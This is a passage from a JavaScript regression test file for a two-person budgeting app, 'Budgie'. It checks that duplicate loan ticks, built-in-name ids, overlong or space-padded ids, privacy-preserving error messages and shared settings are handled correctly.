  F.call({key: F.kS, ops: [settle("set-s2", 20)]});
  ok("R19: settling up again for something new still counts", !rows().find(r => r.id === "set-s2").deleted && Math.abs(owed()) < 0.005, owed());
}

// ================= review 2026-10-26 (1.4.5) =================
// A1: you both ticking the same loan repayment (one offline) only pays it off once
{
  const F = fresh(), key = "loan:sofa:2026-12-28";
  F.call({key: F.kS, ops: [{op: "put", table: "settlements", row: {id: "set-paid", date: "2026-12-28", from: "sophie", to: "ethan", amount: 200, loan: "sofa", key}}]});
  const r = F.call({key: F.kE, ops: [{op: "put", table: "settlements", row: {id: "set-arrived", date: "2026-12-29", from: "sophie", to: "ethan", amount: 200, loan: "sofa", key}}]});
  const L = B.load(F.call({key: F.kE, full: true}).rows, "2026-12-30");
  ok("A1: the second tick of one loan repayment is kept as a copy", r.applied.length === 1 && (F.c.readTable_("settlements").rows.find(x => x.id === "set-arrived") || {}).deleted === true, r);
  ok("A1: so the loan has £400 left, not £200", B.loans(L, "ethan", "2026-12-30")[0].left === 400, B.loans(L, "ethan", "2026-12-30")[0]);
  // the next month's repayment is a different one
  const r2 = F.call({key: F.kE, ops: [{op: "put", table: "settlements", row: {id: "set-jan", date: "2027-01-28", from: "sophie", to: "ethan", amount: 200, loan: "sofa", key: "loan:sofa:2027-01-28"}}]});
  ok("A1: next month's repayment still counts", r2.applied.length === 1 && !(F.c.readTable_("settlements").rows.find(x => x.id === "set-jan") || {}).deleted);
}

// A3: a refusal reads the same whether the other one's row is there or not, so it can't be used to find out about it
{
  const F = fresh();
  F.call({key: F.kE, ops: [
    {op: "put", table: "settings", row: {id: "ethan:bank.rule.corner shop", person: "ethan", key: "bank.rule.corner shop", value: "e-fun"}},
    {op: "put", table: "exceptions", row: {id: "x-e-phone-2026-11-05-skip", item: "e-phone", date: "2026-11-05", action: "skip"}},
    {op: "put", table: "transactions", row: {id: "t-e-secret", date: "2026-11-01", person: "ethan", amount: 5, budget: "e-fun", account: "e-main"}}]});
  const errs = (ops) => F.call({key: F.kS, ops}).rejected.map(r => r.error);
  const there = errs([
    {op: "put", table: "settings", row: {id: "ethan:bank.rule.corner shop", person: "sophie", key: "bank.rule.corner shop", value: "x"}},
    {op: "put", table: "exceptions", row: {id: "x-e-phone-2026-11-05-skip", item: "s-gym", date: "2026-11-05", action: "skip"}},
    {op: "delete", table: "exceptions", id: "x-e-phone-2026-11-05-skip"},
    {op: "put", table: "transactions", row: {id: "t-e-secret", account: "s-main"}}]);
  const notThere = errs([
    {op: "put", table: "settings", row: {id: "ethan:bank.rule.other shop", person: "sophie", key: "bank.rule.other shop", value: "x"}},
    {op: "put", table: "exceptions", row: {id: "x-e-phone-2026-12-05-skip", item: "s-gym", date: "2026-12-05", action: "skip"}},
    {op: "delete", table: "exceptions", id: "x-e-phone-2026-12-05-skip"},
    {op: "put", table: "transactions", row: {id: "t-nothing-here", account: "s-main"}}]);
  ok("A3: the same answer for the other one's rows whether they exist or not", there.length === 4 && JSON.stringify(there.map(e => e.replace(/\(.*\)/, ""))) === JSON.stringify(notThere.map(e => e.replace(/\(.*\)/, ""))), {there, notThere});
  ok("A3: and it reads as plain English", notThere.every(e => !/they's/.test(e)), notThere);
  // your own changes are unaffected
  const mine = F.call({key: F.kS, ops: [{op: "put", table: "settings", row: {id: "sophie:theme.mode", person: "sophie", key: "theme.mode", value: "dark"}}, {op: "put", table: "exceptions", row: {id: "x-s-gym-2026-12-16-skip", item: "s-gym", date: "2026-12-16", action: "skip"}}]});
  ok("A3: your own settings and changes still save", mine.applied.length === 2 && !mine.rejected.length, mine.rejected);
}

// R1: Caledonite's amounts are rounded the same way as Budgie's
{ const F = fresh(); ok("R1: calendar money rounds halves as Budgie does", [F.c.calMoney_(10.075), F.c.calMoney_(1.005), F.c.calMoney_(1200), F.c.calMoney_(-2.5)].join() === "£10.08,£1.01,£1,200,-£2.5", [F.c.calMoney_(10.075), F.c.calMoney_(1.005), F.c.calMoney_(1200), F.c.calMoney_(-2.5)]); }

// R2: a budget tab refresh that keeps failing is tried at most once a minute, not after every change
{
  const F = fresh(), real = F.c.refreshBudgetTabs; let n = 0;
  F.env.props.VIEWS_AT = "0"; F.c.refreshBudgetTabs = () => { n++; throw new Error("tab name too long"); };
  const w = i => F.call({key: F.kE, ops: [{op: "put", table: "transactions", row: {id: "t-r2-" + i, date: "2026-10-27", person: "ethan", amount: 1, budget: "e-fun", account: "e-main"}}]});
  const a = w(1), b2 = w(2), c3 = w(3);
  ok("R2: a failing refresh is tried once in a minute, and the changes still save", n === 1 && a.applied.length === 1 && b2.applied.length === 1 && c3.applied.length === 1 && /tab name too long/.test(a.viewError || ""), {n, a: a.viewError});
  F.c.refreshBudgetTabs = real;
}

// R3: a new row with an id too long for a cell is turned down, so it can't hold up the changes after it
{
  const F = fresh(), long = "t-" + "x".repeat(60000);
  const r = F.call({key: F.kE, ops: [{op: "put", table: "transactions", id: long, row: {date: "2026-10-27", person: "ethan", amount: 1, budget: "e-fun", account: "e-main"}}, {op: "put", table: "transactions", row: {id: "t-after-long", date: "2026-10-27", person: "ethan", amount: 2, budget: "e-fun", account: "e-main"}}]});
  ok("R3: an id too long is refused for good (not retried), and the next change still saves", r.rejected.length === 1 && r.rejected[0].retry === false && r.applied.length === 1 && r.applied[0].id === "t-after-long", r.rejected.map(x => [x.error, x.retry]));
}

// W6: a setting's id ("ethan:share.payments") and a one-date change's id ("x-e-rent-2026-12-15-skip") can't be taken
// ahead of time in another tab by the other one of you, which would stop the owner making that setting or change
{
  const F = fresh();
  const sq = F.call({key: F.kS, ops: [{op: "put", table: "transactions", row: {id: "ethan:share.payments", date: "2026-10-27", person: "sophie", amount: 1, budget: "s-fun", account: "s-main"}},
    {op: "put", table: "gifts", row: {id: "ethan:bank.map.pot_bills", person: "sophie", name: "x"}},
    {op: "put", table: "transactions", row: {id: "x-e-rent-2026-12-15-skip", date: "2026-10-27", person: "sophie", amount: 1, budget: "s-fun", account: "s-main"}},
    {op: "put", table: "transactions", row: {id: "t-r4-hers", date: "2026-10-27", person: "sophie", amount: 1, budget: "s-fun", account: "s-main"}}]});
  ok("W6: those ids are refused in other tabs (her own payment still saves)", sq.rejected.map(x => x.i).join() === "0,1,2" && sq.applied.map(x => x.id).join() === "t-r4-hers" && sq.rejected.every(x => /can't change that/.test(x.error)), sq);
  const e = F.call({key: F.kE, ops: [{op: "put", table: "settings", row: {person: "ethan", key: "share.payments", value: "true"}}, {op: "put", table: "exceptions", row: {id: "x-e-rent-2026-12-15-skip", item: "e-rent", date: "2026-12-15", action: "skip"}}]});
  ok("W6: so Ethan can still make them", !e.rejected.length && e.applied.length === 2, e.rejected);
}

// #5 the one-file backend (apps-script/Budgie.gs, made by migrate/build.js) must be built from the current files
{
  const fs = require("fs"), path = require("path"), dir = path.join(__dirname, ".."), bundle = path.join(dir, "apps-script/Budgie.gs");
  if (fs.existsSync(bundle)) {
    const b = fs.readFileSync(bundle, "utf8"), parts = ["engine.js", "apps-script/Code.gs", "apps-script/Prices.gs", "apps-script/BankFeeds.gs", "apps-script/Extras.gs"].filter(f => fs.existsSync(path.join(dir, f)));
    const stale = parts.filter(f => b.indexOf(fs.readFileSync(path.join(dir, f), "utf8")) < 0);
    ok("#5 Budgie.gs is up to date (run node migrate/build.js)", !stale.length, stale);
  }
}
// ================= review 2026-10-27 (1.4.7) =================
// P1: an id or an app called like a built-in JavaScript name ("constructor", "__proto__", "toString") is just a name:
// it's never mistaken for a row that's already there, and isn't an app Budgie knows
{
  const F = fresh();
  const r = F.call({key: F.kE, ops: [{op: "put", table: "splits", row: {id: "constructor", name: "Odd", shares: "ethan:1, sophie:1"}},
    {op: "put", table: "splits", row: {id: "__proto__", name: "Odder", shares: "ethan:2, sophie:1"}},
    {op: "put", table: "transactions", row: {id: "toString", date: "2026-10-28", person: "ethan", amount: 4, budget: "e-fun", account: "e-main", split: "__proto__"}}]});
  ok("P1: rows with built-in names as ids are saved as new rows", r.applied.length === 3 && !r.rejected.length, r.rejected);
  F.c.CACHE_ = {};
  const sp = F.c.readTable_("splits").rows, tx = F.c.readTable_("transactions").rows;
  ok("P1: and are in the sheet as ordinary rows", sp.some(x => x.id === "constructor" && x.name === "Odd") && sp.some(x => x.id === "__proto__" && x.name === "Odder") && tx.some(x => x.id === "toString"), sp.map(x => x.id));
  ok("P1: nothing leaks into JavaScript's own objects", ({}).name === undefined && ({}).shares === undefined && Object.shares === undefined);
  const L = B.load(F.call({key: F.kE, full: true}).rows, "2026-10-28");
  near("P1: the engine reads a split called __proto__ like any other", B.between(L, "ethan", "2026-10-28").owedToMe, 4 / 3);
  ok("P1: and an unknown id still isn't found", B.person(L, "hasOwnProperty").name === "hasOwnProperty" && B.accName(L, "toString") === "toString");
  const a = F.call({key: F.kE, action: "app.link", app: "constructor"});
  ok("P1: an app called constructor isn't one Budgie knows", a.ok === false && !a.link && !Object.keys(F.env.props).some(k => /constructor/.test(k)), a);
}

// P2: a sharing setting that's been taken off counts as off, as it does in the app and the engine
{
  const F = fresh(t => t.transactions.push({id: "s-own", date: "2026-10-27", person: "sophie", amount: 12, budget: "s-food", account: "s-main"}));
  F.call({key: F.kS, ops: [{op: "put", table: "settings", row: {id: "sophie:share.payments", person: "sophie", key: "share.payments", value: "true"}}]});
  const E = phone(F, F.kE); E.sync();
  ok("P2: (shared while it's on)", E.T.transactions.some(x => x.id === "s-own"));
  F.call({key: F.kS, ops: [{op: "delete", table: "settings", id: "sophie:share.payments"}]});
  wait(5100); E.sync();
  ok("P2: once Sophie's setting is taken off, her own payments leave Ethan's phone", !E.T.transactions.some(x => x.id === "s-own" && !x.deleted), E.T.transactions.filter(x => x.id === "s-own"));
  ok("P2: and a full sync doesn't send them either", !F.call({key: F.kE, full: true}).rows.transactions.some(x => x.id === "s-own"));
}

// P3: a number with more than 15 digits (a long reference in a note) is kept as typed, not rounded by the sheet
{
  const F = fresh(), c = F.c;
  ok("P3: 20 digits are kept as text", c.cell_("12345678901234567890") === "'12345678901234567890" && c.cell_("-1234567890123456.5") === "'-1234567890123456.5", [c.cell_("12345678901234567890"), c.cell_("-1234567890123456.5")]);
  ok("P3: ordinary numbers are still numbers to the sheet", c.cell_("123456789012345") === "123456789012345" && c.cell_("12.5") === "12.5" && c.cell_("0.05") === "0.05" && c.cell_("-40") === "-40" && c.cell_(1234567890123456789) === 1234567890123456789);
}

// ================= review 2026-10-27b (1.4.8) =================
// K1: Peckish sending its shop again (a name change, or its list catching up), for one the bank matched and you took
// off in Budgie, isn't Peckish taking it off: it stays off, stays Peckish's, and its note isn't changed
{
  const F = fresh(), c = F.c;
  const kP = JSON.parse(Buffer.from(c.appLink("ethan", "peckish").split("#connect=")[1], "base64url").toString()).k;
  const shop = {id: "t-pk-k1", date: new Date().toISOString().slice(0, 10), person: "ethan", amount: 12, budget: "e-food-b", note: "Aldi (Peckish)", source: "peckish"};
  F.call({key: kP, ops: [{op: "put", table: "transactions", row: shop}]});
  c.CACHE_ = {}; c.applyOne_("ethan", {op: "put", table: "transactions", row: {id: "t-pk-k1", bankId: "monzo:tx_k1"}}, Date.now(), "bank", {sys: true}); c.CACHE_ = {};
  F.call({key: F.kE, ops: [{op: "delete", table: "transactions", id: "t-pk-k1"}]});
  const again = F.call({key: kP, ops: [{op: "put", table: "transactions", row: Object.assign({}, shop, {note: "Aldi big shop (Peckish)", deleted: false})}]});
  c.CACHE_ = {}; const row = c.readTable_("transactions").rows.find(x => x.id === "t-pk-k1");
  ok("K1: it stays off, and is still Peckish's, without a note saying Peckish took it off", again.applied.length === 1 && row.deleted === true && row.source === "peckish" && !/taken off in Peckish/.test(row.note) && row.review !== true, row);
  ok("K1: Peckish really taking it off still works", F.call({key: kP, ops: [{op: "delete", table: "transactions", id: "t-pk-k1"}]}).applied.length === 1);
}

// ================= review 2026-10-27c (1.4.9) =================
// L3: the rest of a repayment that was only partly paid under its own key (the monthly amount went up after it was
// ticked) is saved when it's ticked, rather than taken for a copy of the first part
{
  const F = fresh(), key = "loan:sofa:2026-12-28";
  F.call({key: F.kS, ops: [{op: "put", table: "settlements", row: {id: "set-dec", date: "2026-12-28", from: "sophie", to: "ethan", amount: 200, loan: "sofa", key}}]});
  F.call({key: F.kE, ops: [{op: "put", table: "loans", row: {id: "sofa", lender: "ethan", borrower: "sophie", name: "Sofa", amount: 600, date: "2026-10-25", repay: 250, repayFrom: "2026-12-28", repayDay: "28"}}]});
  const r = F.call({key: F.kS, ops: [{op: "put", table: "settlements", row: {id: "set-dec2", date: "2026-12-30", from: "sophie", to: "ethan", amount: 50, loan: "sofa", key}}]});
  const L = B.load(F.call({key: F.kE, full: true}).rows, "2026-12-31"), l = B.loans(L, "ethan", "2026-12-31")[0];
  ok("L3: the rest of a partly paid repayment counts", r.applied.length === 1 && !(F.c.readTable_("settlements").rows.find(x => x.id === "set-dec2") || {}).deleted, r);
  ok("L3: so December's is paid and £350 is left", l.left === 350 && l.plan[0].date === "2027-01-28", l);
  // and a second tick once it's all paid is still a copy
  const r2 = F.call({key: F.kE, ops: [{op: "put", table: "settlements", row: {id: "set-dec3", date: "2026-12-31", from: "sophie", to: "ethan", amount: 50, loan: "sofa", key}}]});
  ok("L3: ticking it again once it's paid is kept as a copy", r2.applied.length === 1 && (F.c.readTable_("settlements").rows.find(x => x.id === "set-dec3") || {}).deleted === true, r2);
}

// ================= review 2026-10-27 (1.4.12) =================
// Q3: an id is one thing whatever its tab, and the engine reads ids without spaces at either end: a new row whose id has
// a space at the start or end ("e-main ") is turned away, so it can't stand in for Ethan's main account on his phone
{
  const F = fresh();
  const r = F.call({key: F.kS, ops: [{op: "put", table: "accounts", row: {id: "e-main ", owner: "sophie", name: "Main account", kind: "pot"}}, {op: "put", table: "transactions", row: {id: " t-ws", date: "2026-10-27", person: "sophie", amount: 5, budget: "s-food", account: "s-main"}}]});
  ok("Q3: ids with a space at either end are turned away", r.applied.length === 0 && r.rejected.length === 2 && r.rejected.every(x => !x.retry), r);
  F.c.CACHE_ = {}; const L = B.load(F.call({key: F.kE, full: true}).rows, "2026-10-28");
  ok("Q3: Ethan's main account is still his on his phone", L.byId["e-main"].owner === "ethan", L.byId["e-main"]);
}

// Q4: a To do move ticked again from a list that hadn't caught up is kept but marked as a copy, so neither the balances
// nor To do change (no "Move £5.48 from Main account to Food pot" the other way); one To do still asks for is a new tick
{
  const F = fresh(t => t.transactions.push({id: "t-q4", date: "2026-10-27", person: "ethan", amount: 5.48, budget: "e-food-b", account: "e-main"}));
  const d = "2026-10-27", view = () => B.load(F.call({key: F.kE, full: true}).rows, d);
  const it = B.todo(view(), "ethan", d).filter(x => x.type === "move")[0];
  const tick = id => F.call({key: F.kE, ops: it.keys.map(k => ({op: "put", table: "moves", row: {id: id, date: d, person: "ethan", from: it.from, to: it.to, amount: k.amount, key: k.key}}))});
  tick("mv-q4a"); const food = B.balances(view(), d)["e-food"];
  const r = tick("mv-q4b"), L = view(), copy = F.c.readTable_("moves").rows.find(x => x.id === "mv-q4b");
  ok("Q4: ticking it again is kept but marked as a copy", r.applied.length === 1 && copy && copy.deleted === true && /Same move as mv-q4a/.test(copy.note), copy);
  ok("Q4: so the Food pot and To do don't change", B.balances(L, d)["e-food"] === food && B.todo(L, "ethan", d).filter(x => x.type === "move").length === 0, {food: B.balances(L, d)["e-food"], todo: B.todo(L, "ethan", d)});
  F.call({key: F.kE, ops: [{op: "put", table: "transactions", row: {id: "t-q4b", date: d, person: "ethan", amount: 3, budget: "e-food-b", account: "e-main"}}]});
  const it2 = B.todo(view(), "ethan", d).filter(x => x.type === "move")[0];
  const r2 = F.call({key: F.kE, ops: it2.keys.map(k => ({op: "put", table: "moves", row: {id: "mv-q4c", date: d, person: "ethan", from: it2.from, to: it2.to, amount: k.amount, key: k.key}}))});
  ok("Q4: more to move back under the same key after another shop is a new tick", r2.applied.length === 1 && F.c.readTable_("moves").rows.find(x => x.id === "mv-q4c").deleted !== true && B.todo(view(), "ethan", d).filter(x => x.type === "move").length === 0, it2);
}

// Q5: a row put straight into the sheet by a script or the Sheets API (no edit trigger, so no "updated" time) still
// reaches a phone that's already synced, and only the phones that may see it
{
  const F = fresh(), first = F.call({key: F.kE}), firstS = F.call({key: F.kS});
  const add = (t, row) => { const sh = F.env.sheets[t], head = sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0]; sh.appendRow(head.map(h => row[h] === undefined ? "" : row[h])); };
  add("loans", {id: "l-q5", lender: "sophie", borrower: "ethan", name: "Dress", amount: 30, date: "2026-10-20"});
  add("transactions", {id: "t-q5", date: "2026-10-27", person: "sophie", amount: 9, budget: "s-food", account: "s-main"});
  const next = F.call({key: F.kE, since: first.now}), nextS = F.call({key: F.kS, since: firstS.now});
  ok("Q5: a loan added straight into the sheet reaches Ethan's phone on its next sync", next.rows.loans.some(r => r.id === "l-q5") && nextS.rows.loans.some(r => r.id === "l-q5"), next.rows.loans);
  ok("Q5: and Sophie's private payment added that way still only reaches her", !next.rows.transactions.some(r => r.id === "t-q5") && nextS.rows.transactions.some(r => r.id === "t-q5"));
}

console.log(fails ? fails + " failed, " + passes + " passed" : "All " + passes + " passed");
process.exit(fails ? 1 : 0);
